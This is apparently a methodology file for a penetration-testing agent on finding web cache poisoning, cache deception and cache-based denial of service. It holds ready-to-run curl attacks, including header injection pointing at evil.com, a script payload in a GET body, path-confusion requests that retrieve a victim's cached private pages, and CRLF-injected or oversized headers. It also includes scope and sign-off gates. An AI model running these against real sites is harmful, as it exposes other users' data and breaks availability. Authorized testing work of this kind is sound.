---
name: hunt-cache-poisoning
description: >
  Hunt for web cache poisoning and cache deception: unkeyed headers/params
  reflected into cached responses, cache-key normalization mismatches, and
  Cache-Control/Deception-based Denial of Service (CPDoS). Use when the
  target sits behind a CDN, reverse proxy cache, or sets Cache-Control/
  Vary/X-Cache headers. Keywords: cache poisoning, cache deception, Vary,
  X-Cache, Cache-Control, CPDoS, Fat GET, unkeyed header.
  Do NOT use for HTTP request smuggling that happens to poison a cache as a
  side effect — that root cause belongs in hunt-http-smuggling.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-444, CWE-525]
  mitre_attack: [T1557, T1190]
  tools: [burpsuite, curl, "Param Miner"]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [hunt-host-header, hunt-http-smuggling, hunt-clickjacking]
---

## Signals

- Response headers show `X-Cache`, `CF-Cache-Status`, `Age`, `Via`, `X-Served-By`, or any CDN fingerprint (Cloudflare, Fastly, Akamai, Varnish).
- `Cache-Control: public, max-age=...` on dynamic-looking pages.
- Reflected content from headers (`X-Forwarded-Host`, `User-Agent`) visible in HTML source.
- Static-looking file extensions on dynamic routes (cache deception target: `/account/settings.json`, `/profile.css`).

## Prerequisites

- Ability to send two near-identical requests and observe cache hit/miss (via `Age` header incrementing, or `X-Cache: HIT`/`MISS`).
- A cache-buster query param to guarantee a fresh cache entry per test (`?cb=<random>`), so you don't poison real users' cache during testing beyond what's authorized.
- Explicit scope confirmation before poisoning a *shared* cache — this can affect other legitimate users; treat as a human-gated action per project rules once a working poison payload is confirmed.

## Methodology

1. **Confirm caching behavior and find the cache key.** Send the same request twice with a unique cache-buster, check for `X-Cache: MISS` then `HIT`:
   ```bash
   curl -s -i "https://target.com/?cb=123456" | grep -i -E 'x-cache|age|cache-control|vary'
   curl -s -i "https://target.com/?cb=123456" | grep -i -E 'x-cache|age'
   ```

2. **Identify unkeyed inputs** — headers/params that influence the response body but are NOT part of the cache key (so poisoning one request's output affects all subsequent cache hits regardless of their own headers). Use Burp's **Param Miner** ("Guess headers") or manually test common culprits:
   ```bash
   # X-Forwarded-Host reflected into canonical link / absolute URLs?
   curl -s -i "https://target.com/?cb=poison1" -H "X-Forwarded-Host: evil.com" | grep -i evil.com

   # confirm it's cached by requesting again WITHOUT the header
   curl -s -i "https://target.com/?cb=poison1" | grep -i evil.com
   ```
   Common unkeyed headers to test: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`, `User-Agent` (on mobile-detection pages), `Accept-Language` (on localized pages not in cache key).

3. **Fat GET / parameter cloaking.** Send a GET with a body, or duplicate params, to see if the cache key only considers the URL path while the origin processes the body/extra param:
   ```bash
   curl -s -i -X GET "https://target.com/?cb=poison2" -d "unkeyed_param=<script>alert(1)</script>"
   ```

4. **Cache key normalization mismatch.** Test whether the CDN and origin disagree on what's part of the path (classic path confusion):
   ```bash
   curl -s -i "https://target.com/en/page?cb=poison3" -H "X-Forwarded-Host: evil.com"
   curl -s -i "https://target.com//page?cb=poison4"          # double slash
   curl -s -i "https://target.com/page%20?cb=poison5"         # trailing encoded space
   curl -s -i "https://target.com/page?cb=poison6&utm_x=1"    # ignored tracking param still varies cache?
   ```

5. **Cache deception** — trick the cache into storing a *personalized/authenticated* response under a URL that looks static, then fetch it unauthenticated:
   ```bash
   # as authenticated user, request a path with a fake static extension
   curl -s -i "https://target.com/account/profile.css" -H "Authorization: Bearer $TOKEN" -b "session=$SESSION"
   # then as unauthenticated attacker, fetch the same path
   curl -s -i "https://target.com/account/profile.css"
   # success if the second response contains the victim's private data
   ```
   Also try path-confusion variants the cache may normalize differently than the app:
   ```bash
   curl -s -i "https://target.com/account/profile/nonexistent.js" -b "session=$SESSION"
   curl -s -i "https://target.com/account/profile%2f%2e%2e%2fnonexistent.js" -b "session=$SESSION"
   ```

6. **CPDoS (Cache Poisoning DoS).** Send a request that triggers an error at the origin but gets cached as the 200 page (HTTP Meta Character / HHO / HMC methods):
   ```bash
   # HTTP Header Oversize — send an oversized header the CDN strips but origin rejects
   curl -s -i "https://target.com/?cb=poison7" -H "X-Oversized: $(python3 -c 'print("A"*9000)')"
   # HTTP Meta Character — a header value with a CR or control char the origin 400s on
   curl -s -i -i "https://target.com/?cb=poison8" -H $'X-Bad: value\r\nX-Injected: 1'
   ```
   Confirm by re-requesting the clean URL and checking if it now 400s/500s for everyone (serve-stale-error poisoning).

## Tooling

- Burp Suite + **Param Miner** extension (automates unkeyed header/param discovery — "Guess headers", "Guess GET parameters").
- `curl -i` with `Age`/`X-Cache` grepping for fast iteration.
- `httpx -ehl` (extract headers) at scale across many paths to find caching CDNs quickly.

## Root Causes

- CDN/cache-key configuration omits headers that the origin application uses to render dynamic content (classic "unkeyed input").
- Path normalization differs between CDN and origin (slashes, encoding, trailing characters), letting one URL serve content for another from the cache's perspective.
- Static-extension-based cache rules applied by path suffix without checking authentication state of the underlying response.
- Origin errors on malformed input that the CDN nonetheless caches as a successful response (missing `Cache-Control: no-store` on error pages).

## Validation Gate (minimum proof)

- Two full request/response pairs: (1) the poisoning request with the injected unkeyed value, (2) a **separate, "clean" request** (no injected header) that nonetheless reflects the attacker's payload and shows `X-Cache: HIT`/incrementing `Age`.
- For cache deception: request/response from an unauthenticated context returning another session's private data, with cache headers proving it came from cache, not freshly rendered.
- For CPDoS: proof a clean follow-up request to the same URL now errors for a new, unrelated client/session.
- Always timestamp and include the cache-buster used so the finding is reproducible without affecting other live traffic.

## Gotchas

- **Minimum proof:** reflection in the *poisoning* response alone is not cache poisoning — you must prove a **second, independent** request retrieves the poisoned content from cache.
- **Common N/A:** `Cache-Control: private, no-store` on the affected responses — if truly enforced end-to-end (verify, don't just read the header — some CDNs override origin headers), cache poisoning is N/A here.
- **Overclaim trap:** reflecting a header into a response that is never cached (e.g. `Cache-Control: no-cache` honored by the CDN) is just header injection/reflected XSS — file under hunt-crlf-injection or XSS, not cache poisoning.
- CDNs frequently key on `Host` already — test on the apex and on every subdomain/path prefix separately, behavior can differ per route.
- Always use a cache-buster per test case to isolate results and avoid clobbering your own evidence between tests.
- Poisoning a shared production cache affects real users immediately — confirm scope and, once a working PoC is found, pause for operator sign-off before leaving the poisoned entry live (purge/revert if possible).

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Shared cache confirmation** — Does the poisoned response actually get served to OTHER users from a shared cache, not just reflected to you?
2. **XSS/content injection via cache** — Can the poisoned cache key store and serve injected HTML/JS to all subsequent visitors?
3. **Unkeyed header discovery** — Have you enumerated all unkeyed headers (X-Forwarded-Host, X-Original-URL) that influence the response but aren't part of the cache key?
4. **Persistence window** — How long does the poisoned entry persist, and can you keep it alive via cache-probing/refresh?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Unkeyed `X-Forwarded-Host` reflected into absolute URLs/canonical links → stored XSS at scale for every visitor hitting the cache (chain with hunt-host-header for the root injection point).
- Cache deception exposing session-bound pages → direct PII/session leakage, chain with hunt-session-management.
- Request smuggling used as the poisoning delivery mechanism → chain with hunt-http-smuggling (different root cause, same CDN target).
- CPDoS → availability impact chains into business-logic/DoS reporting for the engagement.
